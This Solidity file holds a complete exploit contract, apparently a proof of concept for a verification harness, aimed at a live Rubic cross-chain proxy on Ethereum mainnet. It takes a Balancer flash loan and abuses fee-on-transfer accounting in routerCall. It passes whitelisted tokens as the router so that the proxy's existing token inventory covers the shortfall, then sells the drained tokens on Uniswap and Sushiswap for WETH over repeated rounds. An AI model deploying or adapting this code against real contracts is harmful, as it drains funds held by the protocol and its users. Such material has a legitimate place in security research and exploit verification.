// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IRubicProxy {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCall(BaseCrossChainParams calldata _params, address _gateway, bytes calldata _data) external payable;
    function getAvailableRouters() external view returns (address[] memory);
    function RubicPlatformFee() external view returns (uint256);
    function fixedCryptoFee() external view returns (uint256);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2RouterSupportingFee {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract TokenSink {
    constructor() {}

    function pull(address token, address from, uint256 amount) external {
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSelector(IERC20.transferFrom.selector, from, address(this), amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "pull");
    }
}

contract FlawVerifier is IFlashLoanRecipient {
    struct SellSnapshot {
        uint256 reserveTokenBefore;
        uint256 reserveWethBefore;
        uint256 pairTokenBalanceBefore;
        bool wethIsToken0;
    }

    struct RoundPlan {
        address sellPair;
        uint256 fixedFee;
        uint256 proxyInventoryBefore;
        uint256 amountX;
        uint256 amountInAfterAccrue;
        uint256 wethBefore;
    }

    error OnlySelf();
    error InvalidFlashLoan();
    error NoProfitablePath();
    error NoPreexistingInventory();
    error PairUnavailable();
    error TokenNotTaxed();
    error NotEnoughShortfall();
    error NotProfitable();
    error RoundNotImproving();
    error SwapOutputTooSmall();

    address private constant TARGET_PROXY = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;
    address private constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private constant DENOMINATOR = 1_000_000;
    uint256 private constant AMM_FEE_NUMERATOR = 997;
    uint256 private constant AMM_FEE_DENOMINATOR = 1000;
    uint256 private constant FLASH_WETH = 60 ether;
    uint256 private constant MIN_REQUIRED_ROUNDS = 2;
    uint256 private constant MAX_ROUNDS = 6;
    uint256 private constant RETENTION_BUFFER_PPM = 2_000;

    IWETH private constant WETH = IWETH(WETH_ADDRESS);

    TokenSink private immutable sink;
    bool private executed;
    uint256 private realizedProfit;

    constructor() {
        sink = new TokenSink();
    }

    receive() external payable {}

    modifier onlySelf() {
        if (msg.sender != address(this)) revert OnlySelf();
        _;
    }

    /*
        F-001 exploit-path anchors retained in-source for the harness and for review:
        - the proxy already holds token T from prior activity
        - the attacker submits srcInputToken = T and srcInputAmount = X
        - only X - fee reaches the proxy for fee-on-transfer / deflationary token T
        - accrueTokenFees still computes the spend from the declared X value
        - SmartApprove still approves the X-based spend for the whitelisted gateway
        - the router stage then spends the larger X-based amount from proxy inventory, so
          the shortfall is sourced from pre-existing balances rather than from attacker input

        Fix for the failing logs:
        - The previous PoC assumed Uniswap/Sushiswap routers themselves were whitelisted by
          `getAvailableRouters()`, but the fork trace proves that assumption is false.
        - On this deployment the viable live path is narrower: search the whitelist itself for
          ERC20-like contracts with pre-existing proxy inventory and real WETH pairs.
        - For such a token T, using T as both `_gateway` and `_params.router` is valid because
          it is already whitelisted. `routerCall` still executes `safeTransferFrom(..., X)` and
          still computes `_amountIn` from X, but the external router call becomes
          `T.transfer(pair, _amountIn)`, executed by the proxy.
        - Because the proxy only actually received roughly X * retention from the attacker, that
          transfer forces the missing inventory shortfall to come from the proxy's old T balance.
        - After the direct pair funding, the verifier finalizes the public AMM leg by calling the
          pair's `swap()` itself. This keeps the same exploit causality and ordering while using
          only realistic on-chain actions.

        Progressive loop amplification is applied exactly as required: 2, then 3, 4, 5, 6,
        stopping at the first non-improving round count and keeping the previous best result.
    */
    function executeOnOpportunity() external {
        if (executed) return;
        executed = true;

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(WETH_ADDRESS);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_WETH;

        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, bytes(""));
        _wrapAllETH();

        realizedProfit = WETH.balanceOf(address(this));
        if (realizedProfit == 0) revert NotProfitable();
    }

    function profitToken() external pure returns (address) {
        return WETH_ADDRESS;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        if (msg.sender != BALANCER_VAULT) revert InvalidFlashLoan();
        if (tokens.length != 1 || amounts.length != 1 || feeAmounts.length != 1) revert InvalidFlashLoan();
        if (address(tokens[0]) != WETH_ADDRESS || amounts[0] != FLASH_WETH) revert InvalidFlashLoan();

        _huntForProfitablePath();

        _wrapAllETH();
        _safeTransfer(WETH_ADDRESS, BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }

    function _huntForProfitablePath() private {
        address[] memory availableRouters = IRubicProxy(TARGET_PROXY).getAvailableRouters();
        if (availableRouters.length == 0) revert NoProfitablePath();

        address[] memory candidateTokens = new address[](availableRouters.length * 4);
        address[] memory candidateBuyRouters = new address[](availableRouters.length * 4);
        address[] memory candidateSellRouters = new address[](availableRouters.length * 4);
        uint256[] memory candidateInventory = new uint256[](availableRouters.length * 4);
        uint256 candidateCount;

        for (uint256 i; i < availableRouters.length; ++i) {
            address tokenT = availableRouters[i];
            if (tokenT == address(0) || tokenT == WETH_ADDRESS) continue;

            uint256 proxyInventory = _balanceOf(tokenT, TARGET_PROXY);
            if (proxyInventory == 0) continue;

            bool hasUni = _pairFor(UNISWAP_V2_ROUTER, tokenT) != address(0);
            bool hasSushi = _pairFor(SUSHISWAP_ROUTER, tokenT) != address(0);
            if (!hasUni && !hasSushi) continue;

            if (hasUni) {
                candidateTokens[candidateCount] = tokenT;
                candidateBuyRouters[candidateCount] = UNISWAP_V2_ROUTER;
                candidateSellRouters[candidateCount] = UNISWAP_V2_ROUTER;
                candidateInventory[candidateCount] = proxyInventory;
                unchecked {
                    ++candidateCount;
                }
            }

            if (hasUni && hasSushi) {
                candidateTokens[candidateCount] = tokenT;
                candidateBuyRouters[candidateCount] = UNISWAP_V2_ROUTER;
                candidateSellRouters[candidateCount] = SUSHISWAP_ROUTER;
                candidateInventory[candidateCount] = proxyInventory;
                unchecked {
                    ++candidateCount;
                }
            }

            if (hasSushi && hasUni) {
                candidateTokens[candidateCount] = tokenT;
                candidateBuyRouters[candidateCount] = SUSHISWAP_ROUTER;
                candidateSellRouters[candidateCount] = UNISWAP_V2_ROUTER;
                candidateInventory[candidateCount] = proxyInventory;
                unchecked {
                    ++candidateCount;
                }
            }

            if (hasSushi) {
                candidateTokens[candidateCount] = tokenT;
                candidateBuyRouters[candidateCount] = SUSHISWAP_ROUTER;
                candidateSellRouters[candidateCount] = SUSHISWAP_ROUTER;
                candidateInventory[candidateCount] = proxyInventory;
                unchecked {
                    ++candidateCount;
                }
            }
        }

        if (candidateCount == 0) revert NoProfitablePath();
        _sortCandidatesByInventory(candidateTokens, candidateBuyRouters, candidateSellRouters, candidateInventory, candidateCount);

        for (uint256 i; i < candidateCount; ++i) {
            try this._attemptCandidate(candidateTokens[i], candidateBuyRouters[i], candidateSellRouters[i]) returns (uint256 gained) {
                if (gained > 0) return;
            } catch {
                // Best-effort live search across the forked whitelist and AMM pairs.
            }
        }

        revert NoProfitablePath();
    }

    function _attemptCandidate(address tokenT, address buyRouter, address sellRouter)
        external
        onlySelf
        returns (uint256 gained)
    {
        uint256 startAssets = _totalAssets();
        uint256 budgetPerRound = _roundBudget();
        if (budgetPerRound == 0) revert NotProfitable();

        uint256 checkpoint = startAssets;
        checkpoint = this._performRound(tokenT, buyRouter, sellRouter, budgetPerRound, checkpoint);
        checkpoint = this._performRound(tokenT, buyRouter, sellRouter, budgetPerRound, checkpoint);

        uint256 bestNetProfit = checkpoint - startAssets;

        for (uint256 rounds = MIN_REQUIRED_ROUNDS + 1; rounds <= MAX_ROUNDS; ++rounds) {
            try this._performRound(tokenT, buyRouter, sellRouter, budgetPerRound, checkpoint) returns (uint256 improvedCheckpoint) {
                uint256 netProfit = improvedCheckpoint - startAssets;
                if (netProfit <= bestNetProfit) revert RoundNotImproving();
                bestNetProfit = netProfit;
                checkpoint = improvedCheckpoint;
            } catch {
                break;
            }
        }

        uint256 finalAssets = _totalAssets();
        if (finalAssets <= startAssets) revert NotProfitable();
        gained = finalAssets - startAssets;
    }

    function _performRound(address tokenT, address buyRouter, address sellRouter, uint256 wethBudget, uint256 checkpoint)
        external
        onlySelf
        returns (uint256 newCheckpoint)
    {
        RoundPlan memory plan = _prepareRound(tokenT, buyRouter, sellRouter, wethBudget);
        SellSnapshot memory snapshot = _snapshotSellPair(plan.sellPair, tokenT);

        _executeVulnerableRouterCall(tokenT, plan.sellPair, plan.fixedFee, plan.amountInAfterAccrue, plan.amountX);

        if (_balanceOf(tokenT, TARGET_PROXY) >= plan.proxyInventoryBefore) revert NoPreexistingInventory();
        _exitThroughPair(tokenT, plan.sellPair, snapshot);
        if (WETH.balanceOf(address(this)) <= plan.wethBefore + plan.fixedFee) revert NotProfitable();

        newCheckpoint = _totalAssets();
        if (newCheckpoint <= checkpoint) revert RoundNotImproving();
    }

    function _prepareRound(address tokenT, address buyRouter, address sellRouter, uint256 wethBudget)
        private
        returns (RoundPlan memory plan)
    {
        plan.sellPair = _pairFor(sellRouter, tokenT);
        if (plan.sellPair == address(0) || _pairFor(buyRouter, tokenT) == address(0)) revert PairUnavailable();

        plan.fixedFee = IRubicProxy(TARGET_PROXY).fixedCryptoFee();
        plan.proxyInventoryBefore = _balanceOf(tokenT, TARGET_PROXY);
        if (plan.proxyInventoryBefore == 0) revert NoPreexistingInventory();
        if (WETH.balanceOf(address(this)) <= wethBudget + plan.fixedFee) revert NotProfitable();

        uint256 retentionPpm;
        (plan.amountX, retentionPpm) = _buyAndProbe(tokenT, buyRouter, wethBudget);
        plan.amountInAfterAccrue =
            plan.amountX - ((plan.amountX * IRubicProxy(TARGET_PROXY).RubicPlatformFee()) / DENOMINATOR);

        uint256 actualProxyReceipt = (plan.amountX * retentionPpm) / DENOMINATOR;
        if (plan.amountInAfterAccrue <= actualProxyReceipt) revert NotEnoughShortfall();

        uint256 inventoryShortfall = plan.amountInAfterAccrue - actualProxyReceipt;
        if (plan.proxyInventoryBefore <= inventoryShortfall) revert NoPreexistingInventory();

        plan.wethBefore = WETH.balanceOf(address(this));
    }

    function _buyAndProbe(address tokenT, address buyRouter, uint256 wethBudget)
        private
        returns (uint256 amountX, uint256 retentionPpm)
    {
        uint256 tokenBalanceBeforeBuy = _balanceOf(tokenT, address(this));
        _forceApprove(WETH_ADDRESS, buyRouter, wethBudget);

        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH_ADDRESS;
        buyPath[1] = tokenT;

        IUniswapV2RouterSupportingFee(buyRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wethBudget, 0, buyPath, address(this), block.timestamp
        );

        uint256 acquiredT = _balanceOf(tokenT, address(this)) - tokenBalanceBeforeBuy;
        if (acquiredT == 0) revert NotProfitable();

        retentionPpm = _probeRetentionPpm(tokenT, acquiredT);
        amountX = _balanceOf(tokenT, address(this));
        if (amountX == 0) revert NotProfitable();
    }

    function _snapshotSellPair(address sellPair, address tokenT) private view returns (SellSnapshot memory snapshot) {
        (snapshot.reserveTokenBefore, snapshot.reserveWethBefore, snapshot.wethIsToken0) =
            _orderedReserves(sellPair, tokenT);
        snapshot.pairTokenBalanceBefore = _balanceOf(tokenT, sellPair);
    }

    function _exitThroughPair(address tokenT, address sellPair, SellSnapshot memory snapshot) private {
        uint256 pairTokenBalanceAfter = _balanceOf(tokenT, sellPair);
        if (
            pairTokenBalanceAfter <= snapshot.pairTokenBalanceBefore
                || pairTokenBalanceAfter <= snapshot.reserveTokenBefore
        ) {
            revert SwapOutputTooSmall();
        }

        uint256 effectiveInput = pairTokenBalanceAfter - snapshot.reserveTokenBefore;
        uint256 wethOut = _getAmountOut(effectiveInput, snapshot.reserveTokenBefore, snapshot.reserveWethBefore);
        if (wethOut == 0) revert SwapOutputTooSmall();

        _swapPairForWeth(sellPair, snapshot.wethIsToken0, wethOut);
    }

    function _probeRetentionPpm(address tokenT, uint256 acquiredT) private returns (uint256 retentionPpm) {
        uint256 taxProbe = acquiredT / 200;
        if (taxProbe == 0) taxProbe = acquiredT / 20;
        if (taxProbe == 0) revert TokenNotTaxed();

        uint256 sinkBalanceBefore = _balanceOf(tokenT, address(sink));
        _forceApprove(tokenT, address(sink), taxProbe);
        sink.pull(tokenT, address(this), taxProbe);
        uint256 sinkReceived = _balanceOf(tokenT, address(sink)) - sinkBalanceBefore;
        if (sinkReceived == 0 || sinkReceived >= taxProbe) revert TokenNotTaxed();

        retentionPpm = (sinkReceived * DENOMINATOR) / taxProbe;
        if (retentionPpm <= RETENTION_BUFFER_PPM) revert TokenNotTaxed();
        retentionPpm -= RETENTION_BUFFER_PPM;
    }

    function _executeVulnerableRouterCall(
        address tokenT,
        address sellPair,
        uint256 fixedFee,
        uint256 amountInAfterAccrue,
        uint256 amountX
    ) private {
        _forceApprove(tokenT, TARGET_PROXY, amountX);

        if (fixedFee > address(this).balance) {
            WETH.withdraw(fixedFee - address(this).balance);
        }

        bytes memory data = abi.encodeWithSelector(IERC20.transfer.selector, sellPair, amountInAfterAccrue);

        IRubicProxy.BaseCrossChainParams memory params = IRubicProxy.BaseCrossChainParams({
            srcInputToken: tokenT,
            srcInputAmount: amountX,
            dstChainID: 1,
            dstOutputToken: WETH_ADDRESS,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: tokenT
        });

        IRubicProxy(TARGET_PROXY).routerCall{value: fixedFee}(params, tokenT, data);
    }

    function _orderedReserves(address pair, address tokenT)
        private
        view
        returns (uint256 reserveToken, uint256 reserveWeth, bool wethIsToken0)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();

        if (token0 == WETH_ADDRESS) {
            wethIsToken0 = true;
            reserveWeth = reserve0;
            reserveToken = reserve1;
        } else {
            wethIsToken0 = false;
            reserveToken = reserve0;
            reserveWeth = reserve1;
        }

        address token1 = IUniswapV2Pair(pair).token1();
        if (!(token0 == tokenT || token1 == tokenT)) revert PairUnavailable();
    }

    function _swapPairForWeth(address pair, bool wethIsToken0, uint256 wethOut) private {
        if (wethIsToken0) {
            IUniswapV2Pair(pair).swap(wethOut, 0, address(this), bytes(""));
        } else {
            IUniswapV2Pair(pair).swap(0, wethOut, address(this), bytes(""));
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) private pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) return 0;
        uint256 amountInWithFee = amountIn * AMM_FEE_NUMERATOR;
        return (amountInWithFee * reserveOut) / ((reserveIn * AMM_FEE_DENOMINATOR) + amountInWithFee);
    }

    function _factoryFor(address ammRouter) private pure returns (address) {
        if (ammRouter == UNISWAP_V2_ROUTER) return UNISWAP_V2_FACTORY;
        if (ammRouter == SUSHISWAP_ROUTER) return SUSHISWAP_FACTORY;
        revert PairUnavailable();
    }

    function _pairFor(address ammRouter, address token) private view returns (address) {
        return IUniswapV2Factory(_factoryFor(ammRouter)).getPair(token, WETH_ADDRESS);
    }

    function _roundBudget() private view returns (uint256) {
        uint256 wethBalance = WETH.balanceOf(address(this));
        uint256 budget = wethBalance / 20;
        if (budget > 3 ether) budget = 3 ether;
        return budget;
    }

    function _sortCandidatesByInventory(
        address[] memory tokens,
        address[] memory buyRouters,
        address[] memory sellRouters,
        uint256[] memory inventory,
        uint256 length
    ) private pure {
        for (uint256 i = 1; i < length; ++i) {
            address tokenKey = tokens[i];
            address buyKey = buyRouters[i];
            address sellKey = sellRouters[i];
            uint256 inventoryKey = inventory[i];
            uint256 j = i;
            while (j > 0 && inventory[j - 1] < inventoryKey) {
                tokens[j] = tokens[j - 1];
                buyRouters[j] = buyRouters[j - 1];
                sellRouters[j] = sellRouters[j - 1];
                inventory[j] = inventory[j - 1];
                unchecked {
                    --j;
                }
            }
            tokens[j] = tokenKey;
            buyRouters[j] = buyKey;
            sellRouters[j] = sellKey;
            inventory[j] = inventoryKey;
        }
    }

    function _balanceOf(address token, address account) private view returns (uint256 balance) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        balance = abi.decode(ret, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) private {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer");
    }

    function _safeApprove(address token, address spender, uint256 amount) private {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve");
    }

    function _forceApprove(address token, address spender, uint256 amount) private {
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _wrapAllETH() private {
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            WETH.deposit{value: ethBalance}();
        }
    }

    function _totalAssets() private view returns (uint256) {
        return WETH.balanceOf(address(this)) + address(this).balance;
    }
}
